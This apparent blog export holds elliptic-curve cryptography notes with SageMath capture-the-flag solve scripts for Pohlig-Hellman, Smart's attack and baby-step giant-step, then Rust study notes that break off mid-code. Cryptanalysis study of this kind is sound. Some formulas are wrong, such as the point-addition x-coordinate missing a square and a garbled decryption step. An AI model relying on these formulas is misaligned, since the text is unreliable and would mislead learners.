<h1 id="PARALLEL"><a href="#PARALLEL" class="headerlink" title="PARALLEL"></a>PARALLEL</h1><p><strong>Assume:</strong> Parallel lines intersect at infinity which is called the infinity point <code>P</code>. (parallel and intersecting unity)</p>
<p>The properties of infinite <code>P</code>: </p>
<ul>
<li>The infinite <code>P</code> of Line L has only one.</li>
<li>The lines which are parallel to each other have the public infinite $P_{\infty}$. </li>
<li>Any lines which are intersect have different infinite points $P_{\infty}$s. (If they have public infinity,  it will contrary to assumption.)</li>
<li>All infinity points formulate a infinity line.</li>
<li>The total infinity points and all ordinary points in the plane form the projective plane.</li>
</ul>
<h1 id="PROJECTIVE-PLANE-COORDINATE-SYSTEM"><a href="#PROJECTIVE-PLANE-COORDINATE-SYSTEM" class="headerlink" title="PROJECTIVE PLANE COORDINATE SYSTEM"></a>PROJECTIVE PLANE COORDINATE SYSTEM</h1><p><strong>Formulate:</strong> Make $x &#x3D; X&#x2F;Z$, $y &#x3D; Y&#x2F;Z$, ($Z \neq 0$), and the Point <code>A</code> is $(X:Y:Z)$. </p>
<p>The infinity points are expressed as $(X:Y:0)$. The ordinary points is $Z \neq 0$,and the infinities are $Z &#x3D; 0$, meaning that the equation of infinity points is $Z &#x3D; 0$. </p>
<p>Thus, $(X:Y:Z)$ is called as projective plane coordinate system. </p>
<h1 id="ELLIPTIC-CURVE"><a href="#ELLIPTIC-CURVE" class="headerlink" title="ELLIPTIC CURVE"></a>ELLIPTIC CURVE</h1><p><strong>Definition:</strong>  The elliptic curve in projective plane satisfies the equation that $Y^2Z + a_1XYZ + a_3YZ^2 &#x3D; X^3 + a_2X^2Z + a_4XZ^2 + a_6Z^3$, or Weierstrass homogeneous equation $Y^2&#x3D;X^3+AX+B$, where the whole points are non-singular or smooth.</p>
<p> <strong>Non-singular&#x2F;Smooth:</strong> Mathematically, the partial derivatives $F_x(x,y,z), F_y(x,y,z),F_z(x,y,z)$ at any point on the curve cannot be 0 at same time, meaning that any point exists tangent. </p>
<p>Assume that $x &#x3D; X&#x2F;Z, y&#x3D; Y&#x2F;Z$ and substitute into the equation above, we can obtain $y^2 + a_1xy + a_3y &#x3D; x^3 + a_2x^2+a_4x+a_6$ and also the slope is $k &#x3D; (3x^2+2a_2x+a_4 - a_1y)&#x2F;(2y + a_1x+a_3)$. </p>
<img src="/2023/01/11/23-01-11-ECC/1_hashhash.png" class="" title="common ecc">

<p><em>Two curves below which are not satisfied the definition are not elliptic curves , and they are called Singular Curves.</em></p>
<h1 id="ALGORITHM-ON-AN-ELLIPTIC-CURVE"><a href="#ALGORITHM-ON-AN-ELLIPTIC-CURVE" class="headerlink" title="ALGORITHM ON AN ELLIPTIC CURVE"></a>ALGORITHM ON AN ELLIPTIC CURVE</h1><p><strong>Algorithm:</strong>  Arbitrarily take two points <code>P</code> and <code>Q</code> on the elliptic curve (if the two points <code>P</code> and <code>Q</code> coincide, then make the tangent of point <code>P</code>), make the line intersect the other point <code>R&#39;</code> of the elliptic curve, and cross <code>R&#39;</code> to make the parallel line of the y axis intersect the point <code>R</code>, we specify $P+Q &#x3D; R$.</p>
<img src="/2023/01/11/23-01-11-ECC/2_hashhash.png" class="" title="find R">

<p>The infinity $O_{\infty}$ and the point $P$ on the elliptic curve intersect at the point $P$. The action of of infinity $O_{\infty}$ is equivalent to 0, which is called the zero element. The equation is that $O_{\infty} + P &#x3D; P$. </p>
<p><strong>Deduction:</strong> </p>
<ul>
<li>Three points on elliptic curve are in the straight line $A + B + C &#x3D; O_{\infty}$. </li>
<li>The sum of $k$ identical points is denoted $kP$. eg: $P+P+P &#x3D; 2P+P &#x3D; 3P$</li>
</ul>
<p><strong>Notice:</strong> <em>Elliptic curves are not necessarily symmetric with respect to x-axis.</em></p>
<h1 id="ELLIPTIC-CURVE-IN-CRYPTOGRAPHY"><a href="#ELLIPTIC-CURVE-IN-CRYPTOGRAPHY" class="headerlink" title="ELLIPTIC CURVE IN CRYPTOGRAPHY"></a>ELLIPTIC CURVE IN CRYPTOGRAPHY</h1><p><strong>Discretization:</strong> Define elliptic curves on finite field. </p>
<p><strong>Algorithm:</strong> </p>
<ul>
<li><p>Finite field $F_p$ only has finite elements. </p>
</li>
<li><p>$F_p$ has $p$ elements. $F_p \in {0, 1, 2, 3, \dots, p-1}$</p>
</li>
<li><p>+:$a + b \equiv c \mod p$</p>
</li>
<li><p>×:$a \times b \equiv c \mod p$</p>
</li>
<li><p>÷:$a \times b^{-1} \equiv c \mod p$</p>
</li>
<li><p>Unit element &#x3D; 1 ; Zero element &#x3D; 0</p>
</li>
</ul>
<p>The elliptic curves that are suitable for encryption: $y^2 &#x3D; x^3 + ax + b$. </p>
<p>The relationship among $P(x_1, y_1), Q(x_2, y_2)$ and $R(x_3, y_3)$: </p>
<ul>
<li>$x_3 \equiv k - x_1 - x_2 (\mod p)$</li>
<li>$y_3 \equiv k(x_1 - x_3) - y1(\mod p)$</li>
<li>$k$<ul>
<li>if $P &#x3D; Q$, the $k &#x3D; (3x^2 + a)&#x2F;2y_1$</li>
<li>if $P \neq Q$, the $k &#x3D; (y_2 - y_1)&#x2F;(x_2 - x_1)$</li>
</ul>
</li>
</ul>
<p>Point P exists the minimum positive integer $n$, which make $np &#x3D; O_{\infty}$, and we will call $n$ as the order of n. Otherwise, it is called infinite order. </p>
<p><em>n always exists.</em></p>
<h1 id="SIMPLE-ENCRYPTION-AND-DECRYPTION-ON-ELLIPTIC-CURVES"><a href="#SIMPLE-ENCRYPTION-AND-DECRYPTION-ON-ELLIPTIC-CURVES" class="headerlink" title="SIMPLE ENCRYPTION AND DECRYPTION ON ELLIPTIC CURVES"></a>SIMPLE ENCRYPTION AND DECRYPTION ON ELLIPTIC CURVES</h1><img src="/2023/01/11/23-01-11-ECC/3.png" class="" title="description">

<ul>
<li><p>A as the generator and decryptor. B as the encryptor. </p>
</li>
<li><p>A generates the basic parameters. The $(a, b)$ is to generate the elliptic curve. The $G$ is the chosen base point. Then, send $E_p(a, b), K, G$ to B.</p>
</li>
<li><p>B generates the random $r$. Make a encryption and send $C_1 &#x3D; M + rK,C_2 &#x3D; rG$ to A.</p>
</li>
<li><p>A decrypts the ciphers by the equation $M &#x3D; C1 - kG_2$. Finally, A will get message $M$. </p>
</li>
<li><p>PubKey: $K &#x3D; kG$</p>
</li>
<li><p>PriKey: $k$</p>
</li>
</ul>
<p>Common 6 parameters $F(p,a,b,G,n,h)$: </p>
<ul>
<li>$p, a, b \rightarrow E_p(a, b)$: $p$ 200 more digits can ensure the security. </li>
<li>$G$: the chosen base point of $E_p(a, b)$ </li>
<li>$n$: the order of $E_p(a, b)$</li>
<li>$h$: the cofactor and the integer part that $m$, the sum of all points on elliptic curve, divides $n$.</li>
</ul>
<h1 id="ATTACKs"><a href="#ATTACKs" class="headerlink" title="ATTACKs"></a>ATTACKs</h1><p>The important part. </p>
<p>Make some description about the common attacks on elliptic curves in cryptography.</p>
<h2 id="Pohlig-Hellman"><a href="#Pohlig-Hellman" class="headerlink" title="Pohlig-Hellman"></a>Pohlig-Hellman</h2><blockquote>
<p>The order of elliptic curve is factorized into small primes. </p>
</blockquote>
<p><strong>Main idea:</strong> </p>
<ol>
<li>Factorize the order. </li>
<li>Discrete logarithmic problems in factorized primes. </li>
<li>Chinese reminder theorem.</li>
</ol>
<p><strong>Deduction:</strong> </p>
<img src="/2023/01/11/23-01-11-ECC/4.png" class="" title="deduction">

<p><strong>Example:</strong> ECC-2</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># polig_hellman</span></span><br><span class="line">a2 = <span class="number">377999945830334462584412960368612</span></span><br><span class="line">b2 = <span class="number">604811648267717218711247799143415167229480</span></span><br><span class="line">p2 = <span class="number">1256438680873352167711863680253958927079458741172412327087203</span></span><br><span class="line">E2 = EllipticCurve(GF(p2), [a2, b2])</span><br><span class="line">P2 = E2(<span class="number">550637390822762334900354060650869238926454800955557622817950</span> ,<span class="number">700751312208881169841494663466728684704743091638451132521079</span> )</span><br><span class="line">Q2 = E2(<span class="number">1152079922659509908913443110457333432642379532625238229329830</span> , <span class="number">819973744403969324837069647827669815566569448190043645544592</span> )</span><br><span class="line"></span><br><span class="line">factors, exponents = <span class="built_in">zip</span>(*factor(P2.order()))</span><br><span class="line"><span class="comment"># print(factors)</span></span><br><span class="line"><span class="comment"># print(exponents)</span></span><br><span class="line">primes = [factors[i] ^ exponents[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(factors))][:-<span class="number">1</span>]</span><br><span class="line"><span class="comment"># print(primes)</span></span><br><span class="line">dlogs = []</span><br><span class="line"><span class="keyword">for</span> fac <span class="keyword">in</span> primes:</span><br><span class="line">    t = <span class="built_in">int</span>(P2.order()) // <span class="built_in">int</span>(fac)</span><br><span class="line">    dlog = discrete_log(t*Q2, t*P2, operation = <span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">    dlogs += [dlog]</span><br><span class="line"><span class="comment"># print(dlogs)</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(primes) == <span class="built_in">len</span>(dlogs):</span><br><span class="line">    m2 = crt(dlogs, primes)</span><br><span class="line">flag2 = long_to_bytes(m2).decode()</span><br><span class="line"><span class="built_in">print</span>(flag2)</span><br></pre></td></tr></table></figure>

<h2 id="Smart-Attack"><a href="#Smart-Attack" class="headerlink" title="Smart Attack"></a>Smart Attack</h2><blockquote>
<p>$E(F_p) &#x3D; p$, the order of the elliptic curve is a prime. </p>
</blockquote>
<p><em>It will be updated, if I have time.</em></p>
<p><strong>Exp:</strong> ECC-3</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># smart_attack</span></span><br><span class="line">a3 = <span class="number">490963434153515882934487973185142842357175523008183292296815140698999054658777820556076794490414610737654365807063916602037816955706321036900113929329671</span></span><br><span class="line">b3 = <span class="number">7668542654793784988436499086739239442915170287346121645884096222948338279165302213440060079141960679678526016348025029558335977042712382611197995002316466</span></span><br><span class="line">p3 = <span class="number">11093300438765357787693823122068501933326829181518693650897090781749379503427651954028543076247583697669597230934286751428880673539155279232304301123931419</span></span><br><span class="line">E3 = EllipticCurve(GF(p3), [a3, b3])</span><br><span class="line">P3 = E3(<span class="number">10121571443191913072732572831490534620810835306892634555532657696255506898960536955568544782337611042739846570602400973952350443413585203452769205144937861</span> , <span class="number">8425218582467077730409837945083571362745388328043930511865174847436798990397124804357982565055918658197831123970115905304092351218676660067914209199149610</span> )</span><br><span class="line">Q3 = E3(<span class="number">964864009142237137341389653756165935542611153576641370639729304570649749004810980672415306977194223081235401355646820597987366171212332294914445469010927</span> , <span class="number">5162185780511783278449342529269970453734248460302908455520831950343371147566682530583160574217543701164101226640565768860451999819324219344705421407572537</span> )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SmartAttack</span>(<span class="params">P,Q,p</span>):</span><br><span class="line">    E = P.curve()</span><br><span class="line">    Eqp = EllipticCurve(Qp(p, <span class="number">2</span>), [ ZZ(t) + randint(<span class="number">0</span>,p)*p <span class="keyword">for</span> t <span class="keyword">in</span> E.a_invariants() ])</span><br><span class="line"></span><br><span class="line">    P_Qps = Eqp.lift_x(ZZ(P.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> P_Qp <span class="keyword">in</span> P_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(P_Qp.xy()[<span class="number">1</span>]) == P.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    Q_Qps = Eqp.lift_x(ZZ(Q.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> Q_Qp <span class="keyword">in</span> Q_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(Q_Qp.xy()[<span class="number">1</span>]) == Q.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    p_times_P = p*P_Qp</span><br><span class="line">    p_times_Q = p*Q_Qp</span><br><span class="line"></span><br><span class="line">    x_P,y_P = p_times_P.xy()</span><br><span class="line">    x_Q,y_Q = p_times_Q.xy()</span><br><span class="line"></span><br><span class="line">    phi_P = -(x_P/y_P)</span><br><span class="line">    phi_Q = -(x_Q/y_Q)</span><br><span class="line">    k = phi_Q/phi_P</span><br><span class="line">    <span class="keyword">return</span> ZZ(k)</span><br><span class="line"></span><br><span class="line"><span class="comment"># from gmpy2 import is_prime</span></span><br><span class="line"><span class="comment"># print(is_prime(P3.order()))</span></span><br><span class="line">m3 = SmartAttack(P3, Q3, p3)</span><br><span class="line">flag3 = long_to_bytes(m3).decode() + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag3)</span><br></pre></td></tr></table></figure>



<h2 id="BSGS"><a href="#BSGS" class="headerlink" title="BSGS"></a>BSGS</h2><blockquote>
<p>baby step giant step</p>
</blockquote>
<p>discrete_log(P,Q,operation &#x3D; ‘+’)</p>
<p><strong>Problems:</strong> $y^x \equiv z \mod p$</p>
<p>To solve out the $x$.</p>
<h3 id="Original"><a href="#Original" class="headerlink" title="Original"></a>Original</h3><blockquote>
<p>$gcd(y, p) &#x3D; 1$</p>
</blockquote>
<p>Assume $x &#x3D; am - b,m &#x3D; \sqrt{p}$, $a \in [0, m), b\in[0, m)$. </p>
<p><strong>Derivation:</strong><br>$$<br>y^{am-b}\equiv z (\mod p)<br>$$</p>
<p>$$<br>y^{am} \equiv z \cdot y^{b}(\mod p)<br>$$</p>
<p>Brute force enumeration, enumerate the right in $[0, m)$ and calculate into list. At the same time, we enumerate the left in $[0, m)$, comparing the two list to find the $x$. </p>
<h3 id="Extended"><a href="#Extended" class="headerlink" title="Extended"></a>Extended</h3><blockquote>
<p>$gcd(y, p) \neq 1$</p>
</blockquote>
<p>Assume $d &#x3D; gcd(y, p)$. </p>
<p><strong>Derivation:</strong><br>$$<br>y^{x} + kp &#x3D;z<br>$$</p>
<p>$$<br>y\cdot y^{x-1} +kp &#x3D; z<br>$$</p>
<p>If we divide it by $d$., we will get that:<br>$$<br>\frac{y}{d}\cdot y^{x-1} + k \cdot \frac{p}{d} &#x3D;\frac{z}{d}<br>$$<br>Recursive the equation, unless $d &#x3D; 1 $. Assume that the product of all $d$ and we enumerate $c$ times. Thus, we can obtain the condition that $x’ &#x3D; x -c, p’ &#x3D; \frac{p}{g}, z’ &#x3D; \frac{z}{g}$.<br>$$<br>y^{x’} \cdot \frac{y^{c}}{g} \equiv z’ (\mod p’)<br>$$<br>And it convert to the <code>original BSGS</code>.</p>
<p><strong>Example:</strong> ECC-1</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bsgs</span></span><br><span class="line">a1 = <span class="number">46056180</span></span><br><span class="line">b1 = <span class="number">2316783294673</span></span><br><span class="line">p1 = <span class="number">146808027458411567</span></span><br><span class="line">E1 = EllipticCurve(GF(p1), [a1, b1])</span><br><span class="line">P1 = E1(<span class="number">119851377153561800</span> , <span class="number">50725039619018388</span>)</span><br><span class="line">Q1 = E1(<span class="number">22306318711744209</span> , <span class="number">111808951703508717</span>)</span><br><span class="line">m1 = discrete_log(Q1, P1, operation = <span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">flag1 = <span class="string">&#x27;flag&#123;&#x27;</span> + long_to_bytes(m1).decode()</span><br><span class="line"><span class="comment"># print(flag1)</span></span><br></pre></td></tr></table></figure>

<h1 id="ECC"><a href="#ECC" class="headerlink" title="ECC"></a>ECC</h1><h2 id="Definition"><a href="#Definition" class="headerlink" title="Definition"></a>Definition</h2><p>The equation:<br>$$<br>(a, b)\in F, y^2 &#x3D; x^3 + ax + b<br>$$<br>$$<br>\Delta &#x3D; 4a^{3} + 27b^{2} \ne 0<br>$$</p>
<p>if the ECC satisfies the equation, we calculate its discriminant by:<br>$$<br>y^2 + axy + by &#x3D; x^3 + cx^2 + dx + c<br>$$</p>
<h2 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h2><blockquote>
<p><a href="https://lbwang.github.io/2020/04/08/ecc/">https://lbwang.github.io/2020/04/08/ecc/</a></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a = -5; b = 4</span><br><span class="line">E1 = EllipticCurve(RR, [a, b])</span><br><span class="line">show(plot(E1, hue=.9))</span><br></pre></td></tr></table></figure>

<img src="/2023/01/11/23-01-11-ECC/tmp_6b2u08zf.png" class="" title="tmp_6b2u08zf">

<p>if we change the figure of $a$ and $b$, we can get the other EllipticCurves.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a = 2; b = 3</span><br><span class="line">E2 = EllipticCurve(RR, [a, b])</span><br><span class="line">show(plot(E2, hue=.9))</span><br></pre></td></tr></table></figure>

<img src="/2023/01/11/23-01-11-ECC/tmp_o58hsxb2.png" class="" title="tmp_o58hsxb2">

<p>or we make the $a$ and $b$ random, thus we can not predict the curves.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E3 = EllipticCurve(RR, [RR.random_element(), RR.random_element()])</span><br><span class="line">show(plot(EE, hue=.7))</span><br></pre></td></tr></table></figure>

<img src="/2023/01/11/23-01-11-ECC/tmp_iaubxs_y.png" class="" title="tmp_iaubxs_y">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sage: p = 137</span><br><span class="line">sage: F = GF(p)</span><br><span class="line">sage: F = FiniteField(p)</span><br><span class="line">sage: F = GF(p)</span><br><span class="line">sage: E137 = EllipticCurve(F, [F.random_element(), F.random_element()])</span><br><span class="line">sage: show(plot(E137, hue=.7))</span><br><span class="line">Launched png viewer for Graphics object consisting of 1 graphics primitive</span><br><span class="line">sage:</span><br></pre></td></tr></table></figure>

<img src="/2023/01/11/23-01-11-ECC/tmp_pcrtf2_a.png" class="" title="tmp_pcrtf2_a">
]]></content>
      <categories>
        <category>Math</category>
      </categories>
      <tags>
        <tag>ecc</tag>
      </tags>
  </entry>
  <entry>
    <title>Reverse-Write-Up-Zh</title>
    <url>/2023/03/09/Reverse-Write-Up-zh/</url>
    <content><![CDATA[<p>As a routine notepad to record some recurrent tasks in Chinese.</p>
<p>These tasks are somewhat special or interesting, which deserve recording. </p>
<span id="more"></span><!--toc-->
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>recurrent</tag>
      </tags>
  </entry>
  <entry>
    <title>Rust Study</title>
    <url>/2023/06/07/Rust-Study/</url>
    <content><![CDATA[<p>Spend time on studying <code>RUST</code>, stay hungry and stay foolish.</p>
<p>Never give up, keep climbing~</p>
<span id="more"></span><!--toc-->

<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><blockquote>
<p><a href="https://reberhardt.com/cs110l/spring-2020/">https://reberhardt.com/cs110l/spring-2020/</a></p>
<p><a href="https://course.rs/about-book.html">https://course.rs/about-book.html</a></p>
<p><a href="https://practice.rs/why-exercise.html">https://practice.rs/why-exercise.html</a></p>
<p><a href="https://practice.rs/why-exercise.html">https://practice.rs/why-exercise.html</a></p>
<p><a href="https://www.runoob.com/rust/rust-tutorial.html">https://www.runoob.com/rust/rust-tutorial.html</a></p>
<p><a href="https://doc.rust-lang.org/book/ch02-00-guessing-game-tutorial.html">Programming a Guessing Game - The Rust Programming Language (rust-lang.org)</a></p>
</blockquote>
<h1 id="Install-rust"><a href="#Install-rust" class="headerlink" title="Install rust"></a>Install rust</h1><h2 id="fix-success-or-fail"><a href="#fix-success-or-fail" class="headerlink" title="fix success or fail"></a>fix success or fail</h2><p>After installation, we run <code>rustc -V</code> and <code>cargo -V</code> and will see the details of version.</p>
<img src="/2023/06/07/Rust-Study/1.png" class="" title="successful installation">

<h2 id="local-documents"><a href="#local-documents" class="headerlink" title="local documents"></a>local documents</h2><p>Run <code>rustup doc</code>.</p>
<img src="/2023/06/07/Rust-Study/image-20230607150837653.png" class="" title="image-20230607150837653">

<p>When we don’t know how to use the functions, we can find them in <code>API documents</code>.</p>
<img src="/2023/06/07/Rust-Study/image-20230607151245332.png" class="" title="image-20230607151245332">

<h1 id="Build-vscode"><a href="#Build-vscode" class="headerlink" title="Build vscode"></a>Build vscode</h1><h2 id="run-rust-code"><a href="#run-rust-code" class="headerlink" title="run rust code"></a>run rust code</h2><p>I have installed and compiled the environment of the vscode with rust. </p>
<p>An example. </p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Hello, world!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>compile, build and run.</p>
<img src="/2023/06/07/Rust-Study/image-20230607152934985.png" class="" title="image-20230607152934985">

<img src="/2023/06/07/Rust-Study/image-20230607152958615.png" class="" title="image-20230607152958615">

<p>Using the command line and run <code>main.exe</code>, we can also get the output. </p>
<img src="/2023/06/07/Rust-Study/image-20230607153139931.png" class="" title="image-20230607153139931">

<h2 id="install-plugins"><a href="#install-plugins" class="headerlink" title="install plugins"></a>install plugins</h2><p>Some recommended plugins.</p>
<ul>
<li>Even Better TOML: support the complete <code>.toml</code></li>
<li>Error Lens: emm, details of the errors. It will impact <code>sagemath</code>. <em>so, I uninstall it</em></li>
<li>One Dark Pro: theme</li>
<li>CodeLLDB: Debugger</li>
</ul>
<h1 id="Cargo"><a href="#Cargo" class="headerlink" title="Cargo"></a>Cargo</h1><h2 id="compile-project"><a href="#compile-project" class="headerlink" title="compile project"></a>compile project</h2><p>Management about rust.</p>
<p>Run in command line, new the project. </p>
<p>Run <code>cargo run</code>, it will build and compile the project and print the output finally. </p>
<img src="/2023/06/07/Rust-Study/image-20230608145433666.png" class="" title="image-20230608145433666">

<p>It defaults to <code>debug</code> mode. If we want to switch to <code>release</code>  mode to optimize the project, we can run <code>cargo run --release</code> directly. </p>
<img src="/2023/06/07/Rust-Study/image-20230608145805271.png" class="" title="image-20230608145805271">

<p>Use vscode directly, we also achieve the target. </p>
<ul>
<li>cargo<ul>
<li><code>cargo run</code>  mode: debug</li>
<li><code>cargo build</code>  mode: debug</li>
<li><code>cargo run --release</code>  mode: release</li>
<li><code>cargo build --release</code>  mode: release</li>
<li><code>cargo check</code>  check that the project code can be run if the size of project is too large.</li>
</ul>
</li>
<li>vscode<ul>
<li>Use according to what you need.</li>
</ul>
</li>
</ul>
<h2 id="cargo-documents"><a href="#cargo-documents" class="headerlink" title="cargo documents"></a>cargo documents</h2><p><code>cargo.toml</code> and <code>cargo.lock</code> are the core part of cargo. All things about cargo are about these two documents. </p>
<ul>
<li><code>cargo.toml</code>: description of project data, which is import for the rust project. </li>
<li><code>cargo.lock</code>: detailed manifest of project dependencies, which is mainly depended on the rust project itself.</li>
</ul>
<p><code>cargo.toml</code> is like this. It first shows the details about the project, containing <code>name</code>&#x2F;<code>version</code>&#x2F;<code>edition</code>.</p>
<img src="/2023/06/07/Rust-Study/image-20230608163001582.png" class="" title="image-20230608163001582">

<p>Second it shows what it depends on. There are three ways to introduce dependencies. </p>
<ul>
<li>based on <code>crates.io</code>: specify version information</li>
<li>based on <code>the url</code> of the source code of the local repository</li>
<li>based on <code>the absolute or relative path</code> of the local repository</li>
</ul>
<p>Three ways to import dependencies: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[dependencies]</span><br><span class="line">rand = &quot;0.3&quot;</span><br><span class="line">hammer = &#123; version = &quot;0.5.0&quot;&#125;</span><br><span class="line">color = &#123; git = &quot;https://github.com/bjz/color-rs&quot; &#125;</span><br><span class="line">geometry = &#123; path = &quot;crates/geometry&quot; &#125;</span><br></pre></td></tr></table></figure>



<h1 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h1><blockquote>
<p>RustProject&#x2F;greeting</p>
<p>RustProject&#x2F;advanced_code</p>
</blockquote>
<p>test code: </p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">greet_world</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">southern_germany</span> = <span class="string">&quot;Grüß Gott!&quot;</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">chinese</span> = <span class="string">&quot;世界，你好&quot;</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">english</span> = <span class="string">&quot;World, hello&quot;</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">regions</span> = [southern_germany, chinese, english];</span><br><span class="line">    <span class="keyword">for</span> <span class="variable">region</span> <span class="keyword">in</span> regions.<span class="title function_ invoke__">iter</span>() &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, &amp;region);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// or we can use this way to run:</span></span><br><span class="line">    <span class="comment">// for region in regions()&#123;</span></span><br><span class="line">    <span class="comment">//     println!(&quot;&#123;&#125;&quot;, &amp;region);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="title function_ invoke__">greet_world</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>How to run?</p>
<ul>
<li>Vscode, and just <code>run code</code>.</li>
<li>Cmd, open a terminal and go to the root of world_hello project. Run <code>cargo [project_name]</code>.</li>
</ul>
<img src="/2023/06/07/Rust-Study/image-20230801190906631.png" class="" title="image-20230801190906631">

<p>Look at the code carefully, we can get:</p>
<ul>
<li>Rust natively supports <code>UTF-8</code> encode strings.</li>
<li><code>println!</code>. In Rust, this is the macro operator, and we can currently think of a macro as a special type of function.</li>
<li>We use <code>&#123;&#125;</code>, which can automatically recognize the type of the output data.</li>
<li>Rust’s collection types can’t loop directly and need to become iterators.</li>
</ul>
<h2 id="advanced-code"><a href="#advanced-code" class="headerlink" title="advanced code"></a>advanced code</h2><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">penguin_data</span> = <span class="string">&quot;\</span></span><br><span class="line"><span class="string">    common name, length(cm)</span></span><br><span class="line"><span class="string">    Little penguin, 33</span></span><br><span class="line"><span class="string">    Yellow-eyed penguin, 65</span></span><br><span class="line"><span class="string">    Fiordland penguin, 60</span></span><br><span class="line"><span class="string">    Invalid, data</span></span><br><span class="line"><span class="string">    &quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">records</span> = penguin_data.<span class="title function_ invoke__">lines</span>();</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">for</span> (i, record) <span class="keyword">in</span> records.<span class="title function_ invoke__">enumerate</span>() &#123;</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span> || record.<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">len</span>() == <span class="number">0</span> &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 声明一个 fields 变量，类型是 Vec</span></span><br><span class="line">        <span class="comment">// Vec 是 vector 的缩写，是一个可伸缩的集合类型，可以认为是一个动态数组</span></span><br><span class="line">        <span class="comment">// &lt;_&gt;表示 Vec 中的元素类型由编译器自行推断，在很多场景下，都会帮我们省却不少功夫</span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">fields</span>: <span class="type">Vec</span>&lt;_&gt; = record</span><br><span class="line">        .<span class="title function_ invoke__">split</span>(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">        .<span class="title function_ invoke__">map</span>(|field| field.<span class="title function_ invoke__">trim</span>())</span><br><span class="line">        .<span class="title function_ invoke__">collect</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">cfg!</span>(debug_assertions) &#123;</span><br><span class="line">            <span class="comment">//输入到标准错误输出</span></span><br><span class="line">            eprintln!(<span class="string">&quot;debug: &#123;:?&#125; -&gt; &#123;:?&#125;&quot;</span>, record, fields);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">name</span> = fields[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">// 1. 尝试把 fields[1] 的值转换为 f32 类型的浮点数，如果成功，则把 f32 值赋给 length 变量</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// 2. if let 是一个匹配表达式，用来从=右边的结果中，匹配出 length 的值：</span></span><br><span class="line">        <span class="comment">//   1）当=右边的表达式执行成功，则会返回一个 Ok(f32) 的类型，若失败，则会返回一个 Err(e) 类型，if let 的作用就是仅匹配 Ok 也就是成功的情况，如果是错误，就直接忽略</span></span><br><span class="line">        <span class="comment">//   2）同时 if let 还会做一次解构匹配，通过 Ok(length) 去匹配右边的 Ok(f32)，最终把相应的 f32 值赋给 length</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// 3. 当然你也可以忽略成功的情况，用 if let Err(e) = fields[1].parse::&lt;f32&gt;() &#123;...&#125;匹配出错误，然后打印出来</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Ok</span>(length) = fields[<span class="number">1</span>].parse::&lt;<span class="type">f32</span>&gt;() &#123;</span><br><span class="line">            <span class="comment">//输出到标准形式</span></span><br><span class="line">            <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;, &#123;&#125;cm&quot;</span>, name, 